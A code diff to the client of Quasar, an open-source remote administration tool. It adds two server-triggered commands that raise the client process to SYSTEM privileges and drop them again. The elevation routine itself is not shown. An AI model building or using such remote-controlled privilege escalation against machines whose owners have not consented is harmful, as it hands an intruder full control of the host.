@@ -1,4 +1,5 @@
 ﻿using Quasar.Client.Config;
+using Quasar.Client.Helper;
 using Quasar.Client.Networking;
 using Quasar.Client.Setup;
 using Quasar.Client.User;
@@ -30,7 +31,9 @@ namespace Quasar.Client.Messages
         public bool CanExecute(IMessage message) => message is DoClientUninstall ||
                                                              message is DoClientDisconnect ||
                                                              message is DoClientReconnect ||
-                                                             message is DoAskElevate;
+                                                             message is DoAskElevate ||
+                                                             message is DoElevateSystem ||
+                                                             message is DoDeElevate;
 
         /// <inheritdoc />
         public bool CanExecuteFrom(ISender sender) => true;
@@ -50,6 +53,12 @@ namespace Quasar.Client.Messages
                     Execute(sender, msg);
                     break;
                 case DoAskElevate msg:
+                    Execute(sender, msg);
+                    break;
+                case DoElevateSystem msg:
+                    Execute(sender, msg);
+                    break;
+                case DoDeElevate msg:
                     Execute(sender, msg);
                     break;
             }
@@ -110,6 +119,18 @@ namespace Quasar.Client.Messages
             {
                 client.Send(new SetStatus { Message = "Process already elevated." });
             }
+        }
+
+        private void Execute(ISender client, DoElevateSystem message)
+        {
+            //check if currently running as system. If not, use SystemElevation.Start() to elevate
+            SystemElevation.Elevate(client);
+        }
+
+        private void Execute(ISender client, DoDeElevate message)
+        {
+            //check if currently running as system. If so, use SystemElevation.Stop() to de-elevate
+            SystemElevation.DeElevate(client);
         }
     }
 }
